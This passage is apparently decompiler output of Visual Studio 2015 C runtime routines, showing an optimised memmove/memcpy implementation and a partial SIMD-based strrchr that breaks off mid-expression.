//  _memmove
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

void * __cdecl FID_conflict__memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined8 uVar1;
  undefined auVar2 [32];
  undefined auVar3 [32];
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  undefined4 uVar16;
  undefined4 uVar17;
  undefined4 uVar18;
  undefined4 uVar19;
  undefined4 uVar20;
  undefined4 uVar21;
  undefined4 uVar22;
  undefined4 uVar23;
  undefined4 uVar24;
  undefined4 uVar25;
  undefined4 uVar26;
  undefined4 uVar27;
  undefined4 uVar28;
  undefined4 uVar29;
  undefined4 uVar30;
  undefined4 uVar31;
  int iVar32;
  undefined8 *puVar33;
  void *pvVar34;
  uint uVar35;
  size_t sVar36;
  uint uVar37;
  int iVar38;
  undefined8 *puVar39;
  undefined4 *puVar40;
  undefined *puVar41;
  undefined4 *puVar42;
  undefined4 *puVar43;
  undefined4 *puVar44;
  undefined4 uVar45;
  undefined4 uVar46;
  undefined4 uVar47;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar42 = (undefined4 *)(_Size + (int)_Src);
    puVar43 = (undefined4 *)(_Size + (int)_Dst);
    if (0x1f < _Size) {
      if ((DAT_0041b010 >> 1 & 1) == 0) {
        if (((uint)puVar43 & 3) != 0) {
          uVar35 = (uint)puVar43 & 3;
          _Size = _Size - uVar35;
          do {
            *(undefined *)((int)puVar43 - 1) = *(undefined *)((int)puVar42 + -1);
            puVar42 = (undefined4 *)((int)puVar42 + -1);
            puVar43 = (undefined4 *)((int)puVar43 - 1);
            uVar35 = uVar35 - 1;
          } while (uVar35 != 0);
        }
        if (0x1f < _Size) {
          uVar35 = _Size >> 2;
          while( true ) {
            if (uVar35 == 0) break;
            uVar35 = uVar35 - 1;
            puVar43[-1] = puVar42[-1];
            puVar42 = puVar42 + -1;
            puVar43 = puVar43 + -1;
          }
          switch(_Size & 3) {
          case 0:
            return _Dst;
          case 1:
            *(undefined *)((int)puVar43 - 1) = *(undefined *)((int)puVar42 + -1);
            return _Dst;
          case 2:
            *(undefined *)((int)puVar43 - 1) = *(undefined *)((int)puVar42 + -1);
            *(undefined *)((int)puVar43 - 2) = *(undefined *)((int)puVar42 + -2);
            return _Dst;
          case 3:
            *(undefined *)((int)puVar43 - 1) = *(undefined *)((int)puVar42 + -1);
            *(undefined *)((int)puVar43 - 2) = *(undefined *)((int)puVar42 + -2);
            *(undefined *)((int)puVar43 - 3) = *(undefined *)((int)puVar42 + -3);
            return _Dst;
          }
        }
      }
      else {
        while (puVar40 = puVar42, puVar44 = puVar43, ((uint)puVar43 & 0xf) != 0) {
          _Size = _Size - 1;
          puVar42 = (undefined4 *)((int)puVar42 + -1);
          puVar43 = (undefined4 *)((int)puVar43 + -1);
          *(undefined *)puVar43 = *(undefined *)puVar42;
        }
        do {
          puVar42 = puVar40;
          puVar43 = puVar44;
          if (_Size < 0x80) break;
          puVar42 = puVar40 + -0x20;
          puVar43 = puVar44 + -0x20;
          uVar45 = puVar40[-0x1f];
          uVar46 = puVar40[-0x1e];
          uVar47 = puVar40[-0x1d];
          uVar4 = puVar40[-0x1c];
          uVar5 = puVar40[-0x1b];
          uVar6 = puVar40[-0x1a];
          uVar7 = puVar40[-0x19];
          uVar8 = puVar40[-0x18];
          uVar9 = puVar40[-0x17];
          uVar10 = puVar40[-0x16];
          uVar11 = puVar40[-0x15];
          uVar12 = puVar40[-0x14];
          uVar13 = puVar40[-0x13];
          uVar14 = puVar40[-0x12];
          uVar15 = puVar40[-0x11];
          uVar16 = puVar40[-0x10];
          uVar17 = puVar40[-0xf];
          uVar18 = puVar40[-0xe];
          uVar19 = puVar40[-0xd];
          uVar20 = puVar40[-0xc];
          uVar21 = puVar40[-0xb];
          uVar22 = puVar40[-10];
          uVar23 = puVar40[-9];
          uVar24 = puVar40[-8];
          uVar25 = puVar40[-7];
          uVar26 = puVar40[-6];
          uVar27 = puVar40[-5];
          uVar28 = puVar40[-4];
          uVar29 = puVar40[-3];
          uVar30 = puVar40[-2];
          uVar31 = puVar40[-1];
          *puVar43 = *puVar42;
          puVar44[-0x1f] = uVar45;
          puVar44[-0x1e] = uVar46;
          puVar44[-0x1d] = uVar47;
          puVar44[-0x1c] = uVar4;
          puVar44[-0x1b] = uVar5;
          puVar44[-0x1a] = uVar6;
          puVar44[-0x19] = uVar7;
          puVar44[-0x18] = uVar8;
          puVar44[-0x17] = uVar9;
          puVar44[-0x16] = uVar10;
          puVar44[-0x15] = uVar11;
          puVar44[-0x14] = uVar12;
          puVar44[-0x13] = uVar13;
          puVar44[-0x12] = uVar14;
          puVar44[-0x11] = uVar15;
          puVar44[-0x10] = uVar16;
          puVar44[-0xf] = uVar17;
          puVar44[-0xe] = uVar18;
          puVar44[-0xd] = uVar19;
          puVar44[-0xc] = uVar20;
          puVar44[-0xb] = uVar21;
          puVar44[-10] = uVar22;
          puVar44[-9] = uVar23;
          puVar44[-8] = uVar24;
          puVar44[-7] = uVar25;
          puVar44[-6] = uVar26;
          puVar44[-5] = uVar27;
          puVar44[-4] = uVar28;
          puVar44[-3] = uVar29;
          puVar44[-2] = uVar30;
          puVar44[-1] = uVar31;
          _Size = _Size - 0x80;
          puVar40 = puVar42;
          puVar44 = puVar43;
        } while ((_Size & 0xffffff80) != 0);
        puVar40 = puVar42;
        puVar44 = puVar43;
        if (0x1f < _Size) {
          do {
            puVar42 = puVar40 + -8;
            puVar43 = puVar44 + -8;
            uVar45 = puVar40[-7];
            uVar46 = puVar40[-6];
            uVar47 = puVar40[-5];
            uVar4 = puVar40[-4];
            uVar5 = puVar40[-3];
            uVar6 = puVar40[-2];
            uVar7 = puVar40[-1];
            *puVar43 = *puVar42;
            puVar44[-7] = uVar45;
            puVar44[-6] = uVar46;
            puVar44[-5] = uVar47;
            puVar44[-4] = uVar4;
            puVar44[-3] = uVar5;
            puVar44[-2] = uVar6;
            puVar44[-1] = uVar7;
            _Size = _Size - 0x20;
            puVar40 = puVar42;
            puVar44 = puVar43;
          } while ((_Size & 0xffffffe0) != 0);
        }
      }
    }
    for (; (_Size & 0xfffffffc) != 0; _Size = _Size - 4) {
      puVar43 = puVar43 + -1;
      puVar42 = puVar42 + -1;
      *puVar43 = *puVar42;
    }
    for (; _Size != 0; _Size = _Size - 1) {
      puVar43 = (undefined4 *)((int)puVar43 - 1);
      puVar42 = (undefined4 *)((int)puVar42 + -1);
      *(undefined *)puVar43 = *(undefined *)puVar42;
    }
    return _Dst;
  }
  sVar36 = _Size;
  puVar42 = (undefined4 *)_Dst;
  if (_Size < 0x20) goto LAB_004136cb;
  if (_Size < 0x80) {
    if ((DAT_0041b010 >> 1 & 1) != 0) {
LAB_0041369d:
      if (sVar36 == 0) {
        return _Dst;
      }
      for (uVar35 = sVar36 >> 5; uVar35 != 0; uVar35 = uVar35 - 1) {
                    // WARNING: Load size is inaccurate
        uVar45 = *(undefined4 *)((int)_Src + 4);
        uVar46 = *(undefined4 *)((int)_Src + 8);
        uVar47 = *(undefined4 *)((int)_Src + 0xc);
        uVar4 = *(undefined4 *)((int)_Src + 0x10);
        uVar5 = *(undefined4 *)((int)_Src + 0x14);
        uVar6 = *(undefined4 *)((int)_Src + 0x18);
        uVar7 = *(undefined4 *)((int)_Src + 0x1c);
        *puVar42 = *_Src;
        puVar42[1] = uVar45;
        puVar42[2] = uVar46;
        puVar42[3] = uVar47;
        puVar42[4] = uVar4;
        puVar42[5] = uVar5;
        puVar42[6] = uVar6;
        puVar42[7] = uVar7;
        _Src = (void *)((int)_Src + 0x20);
        puVar42 = puVar42 + 8;
      }
      goto LAB_004136cb;
    }
LAB_004133f7:
    uVar35 = (uint)_Dst & 3;
    while (uVar35 != 0) {
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar42 = *_Src;
      _Size = _Size - 1;
      _Src = (void *)((int)_Src + 1);
      puVar42 = (undefined4 *)((int)puVar42 + 1);
      uVar35 = (uint)puVar42 & 3;
    }
  }
  else {
    puVar41 = (undefined *)_Dst;
    if ((DAT_0041bb88 >> 1 & 1) != 0) {
                    // WARNING: Load size is inaccurate
      for (; _Size != 0; _Size = _Size - 1) {
        *puVar41 = *_Src;
        _Src = (undefined *)((int)_Src + 1);
        puVar41 = puVar41 + 1;
      }
      return _Dst;
    }
    if (((((uint)_Dst ^ (uint)_Src) & 0xf) == 0) && ((DAT_0041b010 >> 1 & 1) != 0)) {
      if (((uint)_Src & 0xf) != 0) {
        uVar37 = 0x10 - ((uint)_Src & 0xf);
        _Size = _Size - uVar37;
        for (uVar35 = uVar37 & 3; uVar35 != 0; uVar35 = uVar35 - 1) {
                    // WARNING: Load size is inaccurate
          *(undefined *)puVar42 = *_Src;
          _Src = (void *)((int)_Src + 1);
          puVar42 = (undefined4 *)((int)puVar42 + 1);
        }
        for (uVar37 = uVar37 >> 2; uVar37 != 0; uVar37 = uVar37 - 1) {
                    // WARNING: Load size is inaccurate
          *puVar42 = *_Src;
          _Src = (void *)((int)_Src + 4);
          puVar42 = puVar42 + 1;
        }
      }
      sVar36 = _Size & 0x7f;
      for (uVar35 = _Size >> 7; uVar35 != 0; uVar35 = uVar35 - 1) {
                    // WARNING: Load size is inaccurate
        uVar45 = *(undefined4 *)((int)_Src + 4);
        uVar46 = *(undefined4 *)((int)_Src + 8);
        uVar47 = *(undefined4 *)((int)_Src + 0xc);
        uVar4 = *(undefined4 *)((int)_Src + 0x10);
        uVar5 = *(undefined4 *)((int)_Src + 0x14);
        uVar6 = *(undefined4 *)((int)_Src + 0x18);
        uVar7 = *(undefined4 *)((int)_Src + 0x1c);
        uVar8 = *(undefined4 *)((int)_Src + 0x20);
        uVar9 = *(undefined4 *)((int)_Src + 0x24);
        uVar10 = *(undefined4 *)((int)_Src + 0x28);
        uVar11 = *(undefined4 *)((int)_Src + 0x2c);
        uVar12 = *(undefined4 *)((int)_Src + 0x30);
        uVar13 = *(undefined4 *)((int)_Src + 0x34);
        uVar14 = *(undefined4 *)((int)_Src + 0x38);
        uVar15 = *(undefined4 *)((int)_Src + 0x3c);
        *puVar42 = *_Src;
        puVar42[1] = uVar45;
        puVar42[2] = uVar46;
        puVar42[3] = uVar47;
        puVar42[4] = uVar4;
        puVar42[5] = uVar5;
        puVar42[6] = uVar6;
        puVar42[7] = uVar7;
        puVar42[8] = uVar8;
        puVar42[9] = uVar9;
        puVar42[10] = uVar10;
        puVar42[0xb] = uVar11;
        puVar42[0xc] = uVar12;
        puVar42[0xd] = uVar13;
        puVar42[0xe] = uVar14;
        puVar42[0xf] = uVar15;
        uVar45 = *(undefined4 *)((int)_Src + 0x44);
        uVar46 = *(undefined4 *)((int)_Src + 0x48);
        uVar47 = *(undefined4 *)((int)_Src + 0x4c);
        uVar4 = *(undefined4 *)((int)_Src + 0x50);
        uVar5 = *(undefined4 *)((int)_Src + 0x54);
        uVar6 = *(undefined4 *)((int)_Src + 0x58);
        uVar7 = *(undefined4 *)((int)_Src + 0x5c);
        uVar8 = *(undefined4 *)((int)_Src + 0x60);
        uVar9 = *(undefined4 *)((int)_Src + 100);
        uVar10 = *(undefined4 *)((int)_Src + 0x68);
        uVar11 = *(undefined4 *)((int)_Src + 0x6c);
        uVar12 = *(undefined4 *)((int)_Src + 0x70);
        uVar13 = *(undefined4 *)((int)_Src + 0x74);
        uVar14 = *(undefined4 *)((int)_Src + 0x78);
        uVar15 = *(undefined4 *)((int)_Src + 0x7c);
        puVar42[0x10] = *(undefined4 *)((int)_Src + 0x40);
        puVar42[0x11] = uVar45;
        puVar42[0x12] = uVar46;
        puVar42[0x13] = uVar47;
        puVar42[0x14] = uVar4;
        puVar42[0x15] = uVar5;
        puVar42[0x16] = uVar6;
        puVar42[0x17] = uVar7;
        puVar42[0x18] = uVar8;
        puVar42[0x19] = uVar9;
        puVar42[0x1a] = uVar10;
        puVar42[0x1b] = uVar11;
        puVar42[0x1c] = uVar12;
        puVar42[0x1d] = uVar13;
        puVar42[0x1e] = uVar14;
        puVar42[0x1f] = uVar15;
        _Src = (void *)((int)_Src + 0x80);
        puVar42 = puVar42 + 0x20;
      }
      goto LAB_0041369d;
    }
    if (((DAT_0041bb88 & 1) == 0) || (((uint)_Dst & 3) != 0)) goto LAB_004133f7;
    if (((uint)_Src & 3) == 0) {
      if (((uint)_Dst >> 2 & 1) != 0) {
                    // WARNING: Load size is inaccurate
        uVar45 = *_Src;
        _Size = _Size - 4;
        _Src = (void *)((int)_Src + 4);
        *(undefined4 *)_Dst = uVar45;
        _Dst = (void *)((int)_Dst + 4);
      }
      if (((uint)_Dst >> 3 & 1) != 0) {
                    // WARNING: Load size is inaccurate
        uVar1 = *_Src;
        _Size = _Size - 8;
        _Src = (void *)((int)_Src + 8);
        *(undefined8 *)_Dst = uVar1;
        _Dst = (void *)((int)_Dst + 8);
      }
      if (((uint)_Src & 7) == 0) {
                    // WARNING: Load size is inaccurate
        puVar33 = (undefined8 *)((int)_Src + -8);
        uVar45 = *_Src;
        uVar46 = *(undefined4 *)((int)_Src + 4);
        do {
          puVar39 = puVar33;
          uVar5 = *(undefined4 *)(puVar39 + 4);
          uVar6 = *(undefined4 *)((int)puVar39 + 0x24);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(puVar39 + 2);
          uVar47 = *(undefined4 *)(puVar39 + 7);
          uVar4 = *(undefined4 *)((int)puVar39 + 0x3c);
          auVar3 = *(undefined (*) [32])(puVar39 + 4);
          *(undefined4 *)((int)_Dst + 8) = uVar45;
          *(undefined4 *)((int)_Dst + 0xc) = uVar46;
          *(undefined4 *)((int)_Dst + 0x10) = uVar5;
          *(undefined4 *)((int)_Dst + 0x14) = uVar6;
          *(undefined (*) [16])((int)_Dst + 0x10) = SUB3216(auVar2 >> 0x40,0);
          *(undefined (*) [16])((int)_Dst + 0x20) = SUB3216(auVar3 >> 0x40,0);
          _Dst = (void *)((int)_Dst + 0x30);
          puVar33 = puVar39 + 6;
          uVar45 = uVar47;
          uVar46 = uVar4;
        } while (0x2f < (int)_Size);
        puVar39 = puVar39 + 7;
      }
      else if (((uint)_Src >> 3 & 1) == 0) {
                    // WARNING: Load size is inaccurate
        iVar32 = (int)_Src + -4;
        uVar45 = *_Src;
        uVar46 = *(undefined4 *)((int)_Src + 4);
        uVar47 = *(undefined4 *)((int)_Src + 8);
        do {
          iVar38 = iVar32;
          uVar7 = *(undefined4 *)(iVar38 + 0x20);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(iVar38 + 0x10);
          uVar4 = *(undefined4 *)(iVar38 + 0x34);
          uVar5 = *(undefined4 *)(iVar38 + 0x38);
          uVar6 = *(undefined4 *)(iVar38 + 0x3c);
          auVar3 = *(undefined (*) [32])(iVar38 + 0x20);
          *(undefined4 *)((int)_Dst + 4) = uVar45;
          *(undefined4 *)((int)_Dst + 8) = uVar46;
          *(undefined4 *)((int)_Dst + 0xc) = uVar47;
          *(undefined4 *)((int)_Dst + 0x10) = uVar7;
          *(undefined (*) [16])((int)_Dst + 0x10) = SUB3216(auVar2 >> 0x20,0);
          *(undefined (*) [16])((int)_Dst + 0x20) = SUB3216(auVar3 >> 0x20,0);
          _Dst = (void *)((int)_Dst + 0x30);
          iVar32 = iVar38 + 0x30;
          uVar45 = uVar4;
          uVar46 = uVar5;
          uVar47 = uVar6;
        } while (0x2f < (int)_Size);
        puVar39 = (undefined8 *)(iVar38 + 0x34);
      }
      else {
                    // WARNING: Load size is inaccurate
        iVar32 = (int)_Src + -0xc;
        uVar45 = *_Src;
        do {
          iVar38 = iVar32;
          uVar47 = *(undefined4 *)(iVar38 + 0x20);
          uVar4 = *(undefined4 *)(iVar38 + 0x24);
          uVar5 = *(undefined4 *)(iVar38 + 0x28);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(iVar38 + 0x10);
          uVar46 = *(undefined4 *)(iVar38 + 0x3c);
          auVar3 = *(undefined (*) [32])(iVar38 + 0x20);
          *(undefined4 *)((int)_Dst + 0xc) = uVar45;
          *(undefined4 *)((int)_Dst + 0x10) = uVar47;
          *(undefined4 *)((int)_Dst + 0x14) = uVar4;
          *(undefined4 *)((int)_Dst + 0x18) = uVar5;
          *(undefined (*) [16])((int)_Dst + 0x10) = SUB3216(auVar2 >> 0x60,0);
          *(undefined (*) [16])((int)_Dst + 0x20) = SUB3216(auVar3 >> 0x60,0);
          _Dst = (void *)((int)_Dst + 0x30);
          iVar32 = iVar38 + 0x30;
          uVar45 = uVar46;
        } while (0x2f < (int)_Size);
        puVar39 = (undefined8 *)(iVar38 + 0x3c);
      }
      for (; 0xf < (int)_Size; _Size = _Size - 0x10) {
        uVar45 = *(undefined4 *)puVar39;
        uVar46 = *(undefined4 *)((int)puVar39 + 4);
        uVar47 = *(undefined4 *)(puVar39 + 1);
        uVar4 = *(undefined4 *)((int)puVar39 + 0xc);
        puVar39 = puVar39 + 2;
        *(undefined4 *)_Dst = uVar45;
        *(undefined4 *)((int)_Dst + 4) = uVar46;
        *(undefined4 *)((int)_Dst + 8) = uVar47;
        *(undefined4 *)((int)_Dst + 0xc) = uVar4;
        _Dst = (void *)((int)_Dst + 0x10);
      }
      if ((_Size >> 2 & 1) != 0) {
        uVar45 = *(undefined4 *)puVar39;
        _Size = _Size - 4;
        puVar39 = (undefined8 *)((int)puVar39 + 4);
        *(undefined4 *)_Dst = uVar45;
        _Dst = (void *)((int)_Dst + 4);
      }
      if ((_Size >> 3 & 1) != 0) {
        _Size = _Size - 8;
        *(undefined8 *)_Dst = *puVar39;
      }
                    // WARNING: Could not recover jumptable at 0x004133f5. Too many branches
                    // WARNING: Treating indirect jump as call
      pvVar34 = (void *)(*(code *)(&switchD_00413425::switchdataD_00413434)[_Size])();
      return pvVar34;
    }
  }
  sVar36 = _Size;
  if (0x1f < _Size) {
                    // WARNING: Load size is inaccurate
    for (uVar35 = _Size >> 2; uVar35 != 0; uVar35 = uVar35 - 1) {
      *puVar42 = *_Src;
      _Src = (undefined4 *)((int)_Src + 4);
      puVar42 = puVar42 + 1;
    }
    switch(_Size & 3) {
    case 0:
      return _Dst;
    case 1:
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar42 = *_Src;
      return _Dst;
    case 2:
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar42 = *_Src;
      *(undefined *)((int)puVar42 + 1) = *(undefined *)((int)_Src + 1);
      return _Dst;
    case 3:
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar42 = *_Src;
      *(undefined *)((int)puVar42 + 1) = *(undefined *)((int)_Src + 1);
      *(undefined *)((int)puVar42 + 2) = *(undefined *)((int)_Src + 2);
      return _Dst;
    }
  }
LAB_004136cb:
  if ((sVar36 & 0x1f) != 0) {
    for (uVar35 = (sVar36 & 0x1f) >> 2; uVar35 != 0; uVar35 = uVar35 - 1) {
                    // WARNING: Load size is inaccurate
      *puVar42 = *_Src;
      puVar42 = puVar42 + 1;
      _Src = (void *)((int)_Src + 4);
    }
    for (uVar35 = sVar36 & 3; uVar35 != 0; uVar35 = uVar35 - 1) {
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar42 = *_Src;
      _Src = (void *)((int)_Src + 1);
      puVar42 = (undefined4 *)((int)puVar42 + 1);
    }
  }
  return _Dst;
}



// Library Function - Single Match
//  _strrchr
// 
// Library: Visual Studio 2015 Release

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  int iVar4;
  char *pcVar5;
  char *pcVar6;
  undefined (*pauVar7) [16];
  undefined auVar8 [16];
  undefined auVar10 [16];
  char cVar13;
  char cVar14;
  char cVar15;
  char cVar16;
  char cVar17;
  char cVar18;
  char cVar19;
  undefined auVar12 [16];
  byte bVar9;
  byte bVar11;
  
  if (DAT_0041bb84 != 0) {
    if (DAT_0041bb84 < 2) {
      auVar12 = pshuflw(ZEXT216(CONCAT11((char)_Ch,(char)_Ch)),
                        ZEXT216(CONCAT11((char)_Ch,(char)_Ch)),0);
      uVar1 = -1 << (sbyte)((uint)_Str & 0xf);
      pcVar6 = _Str + -((uint)_Str & 0xf);
      pcVar5 = (char *)0x0;
      while( true ) {
        bVar11 = -(pcVar6[0xf] == '\0');
        auVar10 = CONCAT115(bVar11,CONCAT114(-(pcVar6[0xe] == '\0'),
                                             CONCAT113(-(pcVar6[0xd] == '\0'),
                                                       CONCAT112(-(pcVar6[0xc] == '\0'),
                                                                 CONCAT111(-(pcVar6[0xb] == '\0'),
                                                                           CONCAT110(-(pcVar6[10] ==
                                                                                      '\0'),CONCAT19
                                                  (-(pcVar6[9] == '\0'),
                                                   CONCAT18(-(pcVar6[8] == '\0'),
                                                            CONCAT17(-(pcVar6[7] == '\0'),
                                                                     CONCAT16(-(pcVar6[6] == '\0'),
                                                                              CONCAT15(-(pcVar6[5]
                                                                                        == '\0'),
                                                                                       CONCAT14(-(
                                                  pcVar6[4] == '\0'),
                                                  CONCAT13(-(pcVar6[3] == '\0'),
                                                           CONCAT12(-(pcVar6[2] == '\0'),
                                                                    CONCAT11(-(pcVar6[1] == '\0'),
                                                                             -(*pcVar6 == '\0'))))))
                                                  ))))))))));
        cVar13 = SUB161(auVar12 >> 8,0);
        cVar14 = SUB161(auVar12 >> 0x10,0);
        cVar15 = SUB161(auVar12 >> 0x18,0);
        cVar16 = SUB161(auVar12 >> 0x20,0);
        cVar17 = SUB161(auVar12 >> 0x28,0);
        cVar18 = SUB161(auVar12 >> 0x30,0);
        cVar19 = SUB161(auVar12 >> 0x38,0);
        bVar9 = -(pcVar6[0xf] == cVar19);
        auVar8 = CONCAT115(bVar9,CONCAT114(-(pcVar6[0xe] == cVar18),
                                           CONCAT113(-(pcVar6[0xd] == cVar17),
                                                     CONCAT112(-(pcVar6[0xc] == cVar16),
                                                               CONCAT111(-(pcVar6[0xb] == cVar15),
                                                                         CONCAT110(-(pcVar6[10] ==
                                                                                    cVar14),CONCAT19
                                                  (-(pcVar6[9] == cVar13),
                                                   CONCAT18(-(pcVar6[8] == SUB161(auVar12,0)),
                                                            CONCAT17(-(pcVar6[7] == cVar19),
                                                                     CONCAT16(-(pcVar6[6] == cVar18)
                                                                              ,CONCAT15(-(pcVar6[5]
                                                                                         == cVar17),
                                                                                        CONCAT14(-(
                                                  pcVar6[4] == cVar16),
                                                  CONCAT13(-(pcVar6[3] == cVar15),
                                                           CONCAT12(-(pcVar6[2] == cVar14),
                                                                    CONCAT11(-(pcVar6[1] == cVar13),
                                                                             -(*pcVar6 ==
                                                                              SUB161(auVar12,0))))))
                                                  )))))))))));
        uVar3 = (ushort)((ushort)(SUB161(auVar10 >> 7,0) & 1) |
                         (ushort)(SUB161(auVar10 >> 0xf,0) & 1) << 1 |
                         (ushort)(SUB161(auVar10 >> 0x17,0) & 1) << 2 |
                         (ushort)(SUB161(auVar10 >> 0x1f,0) & 1) << 3 |
                         (ushort)(SUB161(auVar10 >> 0x27,0) & 1) << 4 |
                         (ushort)(SUB161(auVar10 >> 0x2f,0) & 1) << 5 |
                         (ushort)(SUB161(auVar10 >> 0x37,0) & 1) << 6 |
                         (ushort)(SUB161(auVar10 >> 0x3f,0) & 1) << 7 |
                         (ushort)(SUB161(auVar10 >> 0x47,0) & 1) << 8 |
                         (ushort)(SUB161(auVar10 >> 0x4f,0) & 1) << 9 |
                         (ushort)(SUB161(auVar10 >> 0x57,0) & 1) << 10 |
                         (ushort)(SUB161(auVar10 >> 0x5f,0) & 1) << 0xb |
                         (ushort)(SUB161(auVar10 >> 0x67,0) & 1) << 0xc |
                         (ushort)(SUB161(auVar10 >> 0x6f,0) & 1) << 0xd |
                         (ushort)(SUB161(auVar10 >> 0x77,0) & 1) << 0xe |
                        (ushort)(bVar11 >> 7) << 0xf) & uVar1;
        if (uVar3 != 0) break;
        uVar1 = (ushort)((ushort)(SUB161(auVar8 >> 7,0) & 1) |
                         (ushort)(SUB161(auVar8 >> 0xf,0) & 1) << 1 |
                         (ushort)(SUB161(auVar8 >> 0x17,0) & 1) << 2 |
                         (ushort)(SUB161(auVar8 >> 0x1f,0) & 1) << 3 |
                         (ushort)(SUB161(auVar8 >> 0x27,0) & 1) << 4 |
                         (ushort)(SUB161(auVar8 >> 0x2f,0) & 1) << 5 |
                         (ushort)(SUB161(auVar8 >> 0x37,0) & 1) << 6 |
                         (ushort)(SUB161(auVar8 >> 0x3f,0) & 1) << 7 |
                         (ushort)(SUB161(auVar8 >> 0x47,0) & 1) << 8 |
                         (ushort)(SUB161(auVar8 >> 0x4f,0) & 1) << 9 |
                         (ushort)(SUB161(auVar8 >> 0x57,0) & 1) << 10 |
                         (ushort)(SUB161(auVar8 >> 0x5f,0) & 1) << 0xb |
                         (ushort)(SUB161(auVar8 >> 0x67,0) & 1) << 0xc |
                         (ushort)(SUB161(auVar8 >> 0x6f,0) & 1) << 0xd |
                         (ushort)(SUB161(auVar8 >> 0x77,0) & 1) << 0xe | (ushort)(bVar9 >> 7) << 0xf
                        ) & uVar1;
        iVar4 = 0x1f;
        if (uVar1 != 0) {
          for (; uVar1 >> iVar4 == 0; iVar4 = iVar4 + -1) {
          }
        }
        if (uVar1 != 0) {
          pcVar5 = pcVar6 + iVar4;
        }
        uVar1 = 0xffffffff;
        pcVar6 = pcVar6 + 0x10;
      }
      uVar1 = (uVar3 * 2 & uVar3 * -2) - 1 &
              (ushort)((ushort)(SUB161(auVar8 >> 7,0) & 1) |
                       (ushort)(SUB161(auVar8 >> 0xf,0) & 1) << 1 |
                       (ushort)(SUB161(auVar8 >> 0x17,0) & 1) << 2 |
                       (ushort)(SUB161(auVar8 >> 0x1f,0) & 1) << 3 |
                       (ushort)(SUB161(auVar8 >> 0x27,0) & 1) << 4 |
                       (ushort)(SUB161(auVar8 >> 0x2f,0) & 1) << 5 |
                       (ushort)(SUB161(auVar8 >> 0x37,0) & 1) << 6 |
                       (ushort)(SUB161(auVar8 >> 0x3f,0) & 1) << 7 |
                       (ushort)(SUB161(auVar8 >> 0x47,0) & 1) << 8 |
                       (ushort)(SUB161(auVar8 >> 0x4f,0) & 1) << 9 |
                       (ushort)(SUB161(auVar8 >> 0x57,0) & 1) << 10 |
                       (ushort)(SUB161(auVar8 >> 0x5f,0) & 1) << 0xb |
                       (ushort)(SUB161(auVar8 >> 0x67,0) & 1) << 0xc |
                       (ushort)(SUB161(auVar8 >> 0x6f,0) & 1) << 0xd |
                       (ushort)(SUB161(auVar8 >> 0x77,0) & 1) << 0xe | (ushort)(bVar9 >> 7) << 0xf)
              & uVar1;
      iVar4 = 0x1f;
      if (uVar1 != 0) {
        for (; uVar1 >> iVar4 == 0; iVar4 = iVar4 + -1) {
        }
      }
      pcVar6 = pcVar6 + iVar4;
      if (uVar1 == 0) {
        pcVar6 = pcVar5;
      }
      return pcVar6;
    }
    uVar1 = _Ch & 0xff;
    if (uVar1 == 0) {
      pcVar5 = (char *)((uint)_Str & 0xfffffff0);
      auVar12 = CONCAT115(-(pcVar5[0xf] == '\0'),
                          CONCAT114(-(pcVar5[0xe] == '\0'),
                                    CONCAT113(-(pcVar5[0xd] == '\0'),
                                              CONCAT112(-(pcVar5[0xc] == '\0'),
                                                        CONCAT111(-(pcVar5[0xb] == '\0'),
                                                                  CONCAT110(-(pcVar5[10] == '\0'),
                                                                            CONCAT19(-(pcVar5[9] ==
                                                                                      '\0'),CONCAT18
                                                  (-(pcVar5[8] == '\0'),
                                                   CONCAT17(-(pcVar5[7] == '\0'),
                                                            CONCAT16(-(pcVar5[6] == '\0'),
                                                                     CONCAT15(-(pcVar5[5] == '\0'),
                                                                              CONCAT14(-(pcVar5[4]
                                                                                        == '\0'),
                                                                                       CONCAT13(-(
                                                  pcVar5[3] == '\0'),
                                                  CONCAT12(-(pcVar5[2] == '\0'),
                                                           CONCAT11(-(pcVar5[1] == '\0'),
                                                                    -(*pcVar5 == '\0')))))))))))))))
                         );
      uVar1 = (uint)(ushort)((ushort)(SUB161(auVar12 >> 7,0) & 1) |
                             (ushort)(SUB161(auVar12 >> 0xf,0) & 1) << 1 |
                             (ushort)(SUB161(auVar12 >> 0x17,0) & 1) << 2 |
                             (ushort)(SUB161(auVar12 >> 0x1f,0) & 1) << 3 |
                             (ushort)(SUB161(auVar12 >> 0x27,0) & 1) << 4 |
                             (ushort)(SUB161(auVar12 >> 0x2f,0) & 1) << 5 |
                             (ushort)(SUB161(auVar12 >> 0x37,0) & 1) << 6 |
                             (ushort)(SUB161(auVar12 >> 0x3f,0) & 1) << 7 |
                             (ushort)(SUB161(auVar12 >> 0x47,0) & 1) << 8 |
                             (ushort)(SUB161(auVar12 >> 0x4f,0) & 1) << 9 |
                             (ushort)(SUB161(auVar12 >> 0x57,0) & 1) << 10 |
                             (ushort)(SUB161(auVar12 >> 0x5f,0) & 1) << 0xb |
                             (ushort)(SUB161(auVar12 >> 0x67,0) & 1) << 0xc |
                             (ushort)(SUB161(auVar12 >> 0x6f,0) & 1) << 0xd |
                             (ushort)(SUB161(auVar12 >> 0x77,0) & 1) << 0xe |
                            (ushort)((byte)-(pcVar5[0xf] == '\0') >> 7) << 0xf) &
              -1 << ((byte)_Str & 0xf);
      while (uVar1 == 0) {
        pcVar6 = pcVar5 + 0x1f;
        auVar12 = CONCAT115(-(*pcVar6 == '\0'),
                            CONCAT114(-(pcVar5[0x1e] == '\0'),
                                      CONCAT113(-(pcVar5[0x1d] == '\0'),
                                                CONCAT112(-(pcVar5[0x1c] == '\0'),
